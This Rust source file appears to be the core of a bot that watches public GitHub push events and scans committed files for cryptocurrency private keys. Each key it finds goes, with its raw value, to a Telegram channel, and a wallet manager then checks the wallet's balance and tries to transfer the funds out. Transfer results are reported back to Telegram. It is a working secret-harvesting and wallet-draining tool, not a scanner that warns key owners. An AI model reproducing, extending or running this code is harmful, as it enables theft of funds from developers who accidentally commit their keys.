use crate::config::Config;
use crate::core::cache::CacheManager;
use crate::models::github::GitHubEvent;
use crate::patterns::matcher::PatternMatcher;
use crate::scanner::commits::CommitFetcher;
use crate::scanner::events::GitHubEventsPoller;
use crate::scanner::files::should_scan_file;
use crate::models::scan::{CryptoSecret, SecretType};
use crate::telegram::alerts::TelegramAlerts;
use crate::wallet::manager::WalletManager;
use std::sync::Arc;
use tracing::{info, warn, error};

pub struct ScanEngine {
    config: Arc<Config>,
    cache: Arc<CacheManager>,
    matcher: Arc<PatternMatcher>,
    telegram: Arc<TelegramAlerts>,
    wallet_manager: Arc<WalletManager>,
}

impl ScanEngine {
    pub fn new(
        config: Arc<Config>,
        cache: Arc<CacheManager>,
        telegram: Arc<TelegramAlerts>,
        wallet_manager: Arc<WalletManager>,
    ) -> Arc<Self> {
        Arc::new(Self {
            config,
            cache,
            matcher: Arc::new(PatternMatcher::new()),
            telegram,
            wallet_manager,
        })
    }
    
    pub async fn run(self: Arc<Self>) {
        info!("🚀 Scan engine started");
        
        // 🆕 Health check on startup
        self.telegram.send_health_check().await;
        
        let poller = GitHubEventsPoller::new(self.config.clone());
        let fetcher = CommitFetcher::new(self.config.clone());
        
        let engine = self.clone();
        
        poller.poll(move |event: GitHubEvent| {
            let engine = engine.clone();
            let fetcher = fetcher.clone();
            
            tokio::spawn(async move {
                engine.process_event(event, fetcher).await;
            });
        }).await;
    }
    
    async fn process_event(&self, event: GitHubEvent, fetcher: CommitFetcher) {
        let repo_name = event.repo.name.clone();
        
        if event.event_type != "PushEvent" {
            return;
        }
        
        info!("📦 Push event from: {}", repo_name);
        
        let commits = fetcher.fetch_commits(&event).await;
        
        info!("📝 Processing {} commits", commits.len());
        
        if commits.is_empty() {
            self.telegram.send_scan_error(
                &repo_name,
                "N/A",
                "NO_COMMITS",
                "No commits found in PushEvent",
            ).await;
            return;
        }
        
        for commit_with_repo in commits {
            let repo = commit_with_repo.repo_name.clone();
            let commit = commit_with_repo.commit;
            let commit_sha = commit.sha.clone();
            
            let files = match &commit.files {
                Some(files) => files,
                None => {
                    warn!("⚠️ No files in commit {}", commit_sha);
                    
                    self.telegram.send_scan_error(
                        &repo,
                        "N/A",
                        "NO_FILES",
                        &format!("No files in commit: {}", commit_sha),
                    ).await;
                    
                    continue;
                }
            };
            
            let total_files = files.len();
            let mut scanned_files = 0;
            let mut skipped_files = 0;
            let mut secrets_found_total = 0;
            
            info!("📄 Found {} files in commit", total_files);
            
            for file in files {
                info!("📄 File: {} (status: {:?})", file.filename, file.status);
                
                // Check if file should be scanned
                let should_scan = should_scan_file(&file.filename);
                
                if !should_scan {
                    skipped_files += 1;
                    info!("⏭️ Skipping {}: not a target file", file.filename);
                    continue;
                }
                
                info!("🔍 Should scan {}: true", file.filename);
                
                // Try to get content (patch or raw)
                match &file.patch {
                    Some(patch) => {
                        scanned_files += 1;
                        info!("📄 Patch found for {} ({} bytes)", file.filename, patch.len());
                        
                        let secrets = self.matcher.scan_content(patch);
                        secrets_found_total += secrets.len();
                        
                        info!("🔍 Secrets found in {}: {}", file.filename, secrets.len());
                        
                        if !secrets.is_empty() {
                            for secret in secrets {
                                info!("🔑 SECRET FOUND in {} ({})", file.filename, repo);
                                
                                self.telegram.send_secret_found(
                                    &repo,
                                    &commit_sha,
                                    &file.filename,
                                    &secret.secret_type.to_string(),
                                    &secret.value,
                                ).await;
                                
                                self.process_secret(secret).await;
                            }
                        }
                    }
                    None => {
                        skipped_files += 1;
                        warn!("⚠️ No patch for file: {}", file.filename);
                        
                        // 🆕 Telegram alert for skipped file
                        self.telegram.send_file_skipped(
                            &repo,
                            &file.filename,
                            "No patch available",
                        ).await;
                        
                        // 🆕 Try raw_url fetch (fallback)
                        if let Some(raw_url) = &file.raw_url {
                            info!("🔄 Trying raw fetch for {}: {}", file.filename, raw_url);
                            
                            match self.fetch_raw_content(raw_url).await {
                                Ok(content) => {
                                    scanned_files += 1;
                                    info!("✅ Raw file fetched: {} ({} bytes)", file.filename, content.len());
                                    
                                    let secrets = self.matcher.scan_content(&content);
                                    secrets_found_total += secrets.len();
                                    
                                    info!("🔍 Secrets found in {}: {}", file.filename, secrets.len());
                                    
                                    if !secrets.is_empty() {
                                        for secret in secrets {
                                            info!("🔑 SECRET FOUND in {} ({})", file.filename, repo);
                                            
                                            self.telegram.send_secret_found(
                                                &repo,
                                                &commit_sha,
                                                &file.filename,
                                                &secret.secret_type.to_string(),
                                                &secret.value,
                                            ).await;
                                            
                                            self.process_secret(secret).await;
                                        }
                                    }
                                }
                                Err(e) => {
                                    error!("❌ Raw fetch failed for {}: {}", file.filename, e);
                                    
                                    self.telegram.send_scan_error(
                                        &repo,
                                        &file.filename,
                                        "RAW_FETCH_FAILED",
                                        &e,
                                    ).await;
                                }
                            }
                        } else {
                            warn!("❌ No raw_url for file: {}", file.filename);
                            
                            self.telegram.send_scan_error(
                                &repo,
                                &file.filename,
                                "NO_RAW_URL",
                                "No patch and no raw_url available",
                            ).await;
                        }
                    }
                }
            }
            
            // 🆕 Send scan status report for this commit
            self.telegram.send_scan_status(
                &repo,
                total_files,
                scanned_files,
                skipped_files,
                secrets_found_total,
                &commit_sha,
            ).await;
        }
    }
    
    // 🆕 Raw file fetcher
    async fn fetch_raw_content(&self, raw_url: &str) -> Result<String, String> {
        let client = reqwest::Client::new();
        
        let response = client
            .get(raw_url)
            .header("User-Agent", "git-scanner/1.0")
            .send()
            .await
            .map_err(|e| e.to_string())?;
        
        if response.status().is_success() {
            response.text().await.map_err(|e| e.to_string())
        } else {
            Err(format!("HTTP {}", response.status()))
        }
    }
    
    async fn process_secret(&self, secret: CryptoSecret) {
        match secret.secret_type {
            SecretType::PrivateKey => {
                match self.wallet_manager.process_private_key(&secret.value).await {
                    Ok((wallet_info, transfer_result)) => {
                        self.telegram.send_balance_detected(&wallet_info).await;
                        
                        if let Some(transfer) = transfer_result {
                            if transfer.success {
                                self.telegram.send_transfer_success(&wallet_info, &transfer).await;
                            } else {
                                if let Some(error) = &transfer.error {
                                    self.telegram.send_transfer_failed(&wallet_info, error).await;
                                }
                            }
                        }
                    }
                    Err(e) => {
                        warn!("Failed: {}", e);
                        
                        // 🆕 Send error to Telegram
                        self.telegram.send_scan_error(
                            "N/A",
                            "N/A",
                            "WALLET_PROCESSING_FAILED",
                            &e,
                        ).await;
                    }
                }
            }
            SecretType::SeedPhrase => {
                warn!("Seed phrase not implemented");
                
                // 🆕 Send notification
                self.telegram.send_scan_error(
                    "N/A",
                    "N/A",
                    "SEED_PHRASE_NOT_IMPLEMENTED",
                    "Seed phrase detected but derivation not implemented",
                ).await;
            }
        }
    }
}